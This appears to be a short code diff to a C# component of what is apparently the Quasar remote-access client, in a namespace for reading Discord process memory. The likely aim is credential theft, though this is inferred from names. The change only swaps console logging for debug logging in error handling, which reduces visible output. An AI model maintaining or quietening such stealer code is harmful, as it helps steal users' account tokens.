@@ -131,7 +131,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
 
             if (handle == IntPtr.Zero)
             {
-                Console.WriteLine($"Failed to open process {pid}");
+                Debug.WriteLine($"Failed to open process {pid}");
                 return null;
             }
 
@@ -246,7 +246,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                         }
                         catch (Exception ex)
                         {
-                            Console.WriteLine($"Error processing PID {pid}: {ex.Message}");
+                            Debug.WriteLine($"Error processing PID {pid}: {ex.Message}");
                         }
                     });
                 }
